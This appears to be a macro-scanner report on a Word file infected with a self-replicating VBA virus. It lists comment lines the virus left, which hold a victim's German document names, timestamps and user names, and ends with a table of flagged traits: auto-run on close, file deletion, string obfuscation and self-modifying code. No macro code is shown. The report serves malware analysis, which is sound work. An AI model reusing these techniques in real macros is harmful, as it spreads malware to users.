' Vorwort_Pier.doc

' AUVAKalkulation

' 1. Pilsner 0,5 Ltr. Aktion.doc

' 1. Pilsner 0,33 Ltr. Aktion.doc

' Leiter Finanz- …sen Chiffre.doc

' A1041[2].doc

' Anschreiben-GH-FHG, 2004.doc

' Anschreiben-LEH, 2004.doc

' Grafikdaten.doc

' Renault Twingo.doc

' Dokument1

' Aufnahmeantrag SG ES.DOC

' MITGLI~1.XLS

' Hofbrdu Aktion Stammtisch.doc

' Personalplan Mobil 2004.xls

' Blindtext "Brüstlein weiß"

' Blindtext "Guaredisch"

' AussendienstGastro.doc

' TExt Bierbrand!.doc

' Dok1.doc

' Blindtext "Guaredisch"

' Dokument1

' BRIEFBRAU.doc

' flamm.doc

' Dokument1

' Dokument1

' Dokument1

' Feiner Filmverleih.doc

' Italinische Lieder
' 11:15:07  -Montag,14 Mär,2005
' Tobias Grauer
'
' Italienische Lieder

' CURRICULUM_VITAE.doc

' CURRICULUM VITAE.doc

' Terminprobleme.doc

' Ludwigsburg, 31.5..doc

' Loenard Cohen Hallelujah.doc

' hausarbeit thomas bernha#10.doc

' hausarbeit thomas ber#FFBBF.doc

' kopfermannhausarbeit.doc

' Zum Abschied.doc

' Reisen.doc

' Enge.doc

' Kopfermanngeburtstag.doc

' Odenversuch

' 01:51:53  -Freitag,10 Mär,2006
' Tobias Grauer
'
' Odenversuch

' Schwärmerei.doc

' Stuttgartrap/Schluss3.1.06.doc

' Sonett 1

' R B3/05 Alpencross 31.10.05.doc

' R B7/05 Muschelkalk.doc

' R A4/05 Puck.doc

' R A5/05 CIS.doc

' R A6/05 Puck.doc

' Rechn 3. Juli 2004.doc

' Rahmenplan.doc

' Gruppe 1-9.3.2006.doc

' Tanja-er-Übungen.doc

' Gruppen 1u2- 14.3.2006.doc

' Die Standarde.doc

' Mit zwei streichhölzern i.doc

' Notenpapier.doc

' Filmplan5-1.doc

' Filmplan5.doc

' Die Rolle.doc

' Brecht-Proj. Trim 1/06

' Flaumgespinstig Strähnchen.doc

' Bibo 180.doc

' Schattenwurf.doc

' Looping-Flieger.doc

' Albatros-Flieger.doc

' Rechnung für Auftritt.doc

' R A2/05 CIS .doc

' Rechnung Vorlage.doc

' RechnungAuftritt Kopie.doc

' R Vorlage Kopie.doc

' Vorlage Unterrichtsplan.doc

' Vorlage Unterrichtspl#CC068.doc

' Benediktbeuren.doc

' Soll ich denn über Kriege.doc

' Klage.doc

' So heimelig.doc

' Danke.doc

' Dicht gedichtet.doc

' geil hitler.doc

' nähe.doc

' Ihr Schatten - 1. Fassung.doc

' Rache.doc

' Mann wird steinreich.doc

' Konzept.doc

' Lehrverpflichtung_Formular_.doc

' JSRFruehjahr2006.doc

' Liebe Oma.doc

' Konzeption Stimmhygiene.doc

' Konzeption Freie Rede 1.doc

' schulprojekte.doc

' Stimmbildung für Lehrer u.doc

' Stimmbildung und Spre#9931E.doc

' RechnungUnterr..doc

' Rechnungen.doc

' Pressetext Heilbronnf.doc

' lebensversich.

' Allgemeine Produktion#4D2A0.doc

' aok.doc

' AbrechnungTobias Zink.doc

' telpassport.doc

' terrakottaputto.doc

' Chor Theater.doc

' Konzeption Stimmhygiene.doc

' Konzeption Freie Rede 1.doc

' Sonnowonniconniher

' TSHIRT.DOC

' masternonverbal Kopie.doc

' Stuttgarter Zeitung_ kritik.doc

' Kronauer/Mörike.doc

' Die Aufgabe ist immer zu .doc

' An Tagen.doc

' W_KANN_A.DOC

' Fragebogen kulturbeutel.doc

' MUNDWERK.doc

' Jakob Taufe Gebet.doc

' diemitteistimhaus.doc

' Wieso braucht es Mut.doc

' Feiner Filmverleih.doc

' Gedicht-Ampelnostalgie

' Schon rührt nicht Nachtlu.doc

' Unterrichtsplan Staufergy.doc

' MUNDWERK.doc

' 18_04_06_Idee _ Konze#E1BFF.doc

' Konzept Heilbronn.doc

' Stimmtagebegrüßung

' zeitraster + Texte.doc

' Ablaufplan Preisverle#6A7AA.doc

' Programm Darsteller_A#4CFC2.doc

' 7.12.Fellbach.doc

' 14.12.Stresemann.doc

' Olga Stift 2.2.2006.doc

' Olga Stift 23.2.2006.doc

' Übungen Chor.doc

' 06_04_21_ Konzept_Ablauf.doc

' Seltsame Sehnsucht.doc

' Konzept_Heilbronn neu.doc

' Gebet für Taufe v. Jakob.doc

' Schaftal.doc

' perkundhadkek

' Träume .doc

' Die Eselei.doc

' luftzeit.doc

' Ich lebe auf einem Pulver.doc

' ÓnaroderKarlderträumer.doc

' Marseille

' Mozartkugelwahnsinn.doc

' Hugo Ball - Karawane.doc

' Hans der Schwärmer D.#B6316.doc

' Odyssee.doc

' Kleist-GedankenbeimReden.doc

' Lehrangebot_WS_06-07.doc

' Ernst Jandl.doc

' Einleitung2.doc

' Bertolt Brecht.doc

' Donnerstag.doc

' Psychotonik.doc

' PSYCHOTONIK 1.doc

' QUALIFIKATIONSVORHABEN B.doc

' Konzept_Heilbronn neu.doc

' Kriterienkatalog Weit#E42A1.doc

' Übungseinheit-extreme#E429B.doc

' Nonverbale Kriterien.doc

' CIS Knaben.doc

' CISPROGKONZERT.doc

' SE beim CIS 26.4.2006.doc

' SWZ Anfang.doc

' Konzeption Freie Rede 1-1.doc

' Astel-Texte.doc

' MärchenHochzeitPia_Daniel.doc

' Lucinde_1.doc

' Projektbeschreibung-D#E6D16.doc

' Lucinde_2.doc

' Lucinde_3.doc

' Lucinde_4_Sehnsucht_u#E6D2A.doc

' Vorstellungsgespräch #E6DEB.doc

' Speer Programm.doc

' 06:25:38  -Sonntag,23 Jul,2006
' sim salabim
' ichag
'
' Speer Programm.doc

' Verliebte Romantiker #8E64D.doc

' Verliebte Romantiker #8E658.doc

' Verliebte Romantiker_#8E660.doc

' REchnungneu.doc

' 1C27.doc

' Dokument1

' Vertretungsstunden.doc

' 4.Okt.doc

' 9.Okt

' BVS-Akt.Inf.2006-2.doc

' BVS-Einl.06-2HD.doc

' 23.Okt.

' PERSPEKTIVENWECHSEL II.doc

' PERSPEKTIVENWECHSEL I.doc

' QUADRATÜBUNG.doc

' BEOBACHTUNG QUADRAT .doc

' FRAGEN.doc

' Dokument6

' Nondirek.Gesprächsverhalten.doc

' SMALL TALK.doc

' 6.Nov.

' AnfahrtRottenburg.doc

' 20.November.doc

' ProtokollFR07.11.06.doc

' 20.November.doc

' 15., 22.November.doc

' 22.November.doc

' 15., 22.November.doc

' Barbara Kysela.doc

' 11:33:53  -Donnerstag,18 Jan,2007
' sim salabim
' ichag
'
' Bar.doc

' Barbara.doc

' Raum.doc

' Rechnung an mars Barb#B128A.doc

' Raum Kopie.doc

' Raum Kopie.doc

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |1.Inf               |Executable file name                         |
|IOC       |2.Inf               |Executable file name                         |
|IOC       |Akt.Inf             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

